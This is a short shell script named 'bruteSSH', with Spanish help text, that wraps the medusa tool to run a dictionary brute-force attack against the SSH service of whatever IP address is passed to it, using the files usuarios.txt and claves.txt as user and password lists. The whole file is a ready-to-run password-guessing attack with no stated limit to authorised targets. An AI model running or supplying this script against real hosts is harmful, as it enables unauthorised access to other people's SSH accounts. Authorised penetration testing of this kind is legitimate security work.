cat << "INFO"

bruteSSH

INFO
if [ -z "$1" ]; then
        echo 
        echo "Fuerza bruta con diccionarios a SSH."
        echo "Requiere medusa"
        echo "Uso.: sh brutessh.sh <ip>"
        echo 
        exit 0
fi
echo
echo
medusa -h $1 -U usuarios.txt -P claves.txt -M ssh
